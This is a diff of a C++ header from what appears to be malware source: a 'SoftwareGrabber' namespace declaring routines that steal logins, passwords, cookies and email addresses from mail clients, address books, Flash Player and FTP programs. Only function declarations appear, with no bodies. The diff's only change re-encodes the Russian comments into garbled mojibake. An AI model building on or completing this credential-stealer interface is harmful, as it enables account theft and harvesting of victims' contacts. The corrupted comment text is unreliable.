@@ -1,44 +1,44 @@
 #pragma once
 /*
-  Граббер логинов/паролий и т.д. из различного ПО.
+  Р“СЂР°Р±Р±РµСЂ Р»РѕРіРёРЅРѕРІ/РїР°СЂРѕР»РёР№ Рё С‚.Рґ. РёР· СЂР°Р·Р»РёС‡РЅРѕРіРѕ РџРћ.
 */
 namespace SoftwareGrabber
 {
   /*
-    Инициализация.
+    РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
   */
   void init(void);
 
   /*
-    Деинициализация.
+    Р”РµРёРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
   */
   void uninit(void);
 
   /*
-    Поулчение "куков" от Macromedia(Adobe) Flash Player.
+    РџРѕСѓР»С‡РµРЅРёРµ "РєСѓРєРѕРІ" РѕС‚ Macromedia(Adobe) Flash Player.
   */
   void _getMacromediaFlashFiles(void);
 
   /*
-    Удаление "куков" от Macromedia(Adobe) Flash Player.
+    РЈРґР°Р»РµРЅРёРµ "РєСѓРєРѕРІ" РѕС‚ Macromedia(Adobe) Flash Player.
   */
   void _removeMacromediaFlashFiles(void);
 
 #if(BO_SOFTWARE_EMAIL > 0)  
   
   /*
-    Граббер получателей из Windows Mail/Outlook Express.
+    Р“СЂР°Р±Р±РµСЂ РїРѕР»СѓС‡Р°С‚РµР»РµР№ РёР· Windows Mail/Outlook Express.
   */
   void _emailWindowsMailRecipients(void);
   
   /*
-    Граббер логинов из Outlook Express.
-    Теряеть актуальность вместе с XP.
+    Р“СЂР°Р±Р±РµСЂ Р»РѕРіРёРЅРѕРІ РёР· Outlook Express.
+    РўРµСЂСЏРµС‚СЊ Р°РєС‚СѓР°Р»СЊРЅРѕСЃС‚СЊ РІРјРµСЃС‚Рµ СЃ XP.
   */
   void _emailOutlookExpress(void);
 
   /*
-    Граббер логинов из Windows Mail/Windows Live Mail.
+    Р“СЂР°Р±Р±РµСЂ Р»РѕРіРёРЅРѕРІ РёР· Windows Mail/Windows Live Mail.
 
     IN live - true - Windows Live Mail,
               false - Windows Mail.
@@ -46,21 +46,21 @@ namespace SoftwareGrabber
   void _emailWindowsMail(bool live);
   
   /*
-    Получение email'ов из Windows Address Book. Получение проихоид из всех групп, папок, и
-    идентификаторов адресной книги текущего пользователя.
-    Теряеть актуальность вместе с XP.
+    РџРѕР»СѓС‡РµРЅРёРµ email'РѕРІ РёР· Windows Address Book. РџРѕР»СѓС‡РµРЅРёРµ РїСЂРѕРёС…РѕРёРґ РёР· РІСЃРµС… РіСЂСѓРїРї, РїР°РїРѕРє, Рё
+    РёРґРµРЅС‚РёС„РёРєР°С‚РѕСЂРѕРІ Р°РґСЂРµСЃРЅРѕР№ РєРЅРёРіРё С‚РµРєСѓС‰РµРіРѕ РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ.
+    РўРµСЂСЏРµС‚СЊ Р°РєС‚СѓР°Р»СЊРЅРѕСЃС‚СЊ РІРјРµСЃС‚Рµ СЃ XP.
   */
   void _emailWindowsAddressBook(void);
 
   /*
-    Получение email'ов из Windows Contacts.
+    РџРѕР»СѓС‡РµРЅРёРµ email'РѕРІ РёР· Windows Contacts.
   */
   void _emailWindowsContacts(void);
 
   /*
-    Обработка всех E-mail-клиентов.
+    РћР±СЂР°Р±РѕС‚РєР° РІСЃРµС… E-mail-РєР»РёРµРЅС‚РѕРІ.
 
-    Требует ComLibrary.
+    РўСЂРµР±СѓРµС‚ ComLibrary.
   */
   void _emailAll(void);
 #endif
@@ -116,10 +116,10 @@ namespace SoftwareGrabber
   */
   void _ftpSmartFtp(void);
 
-  /*В В В В Handling all FTP-clients.
+  /*Р’В Р’В Р’В Р’В Handling all FTP-clients.
 
-В В В В Requires ComLibrary.
-В В */
+Р’В Р’В Р’В Р’В Requires ComLibrary.
+Р’В Р’В */
   void _ftpAll(void);
 #endif
 };
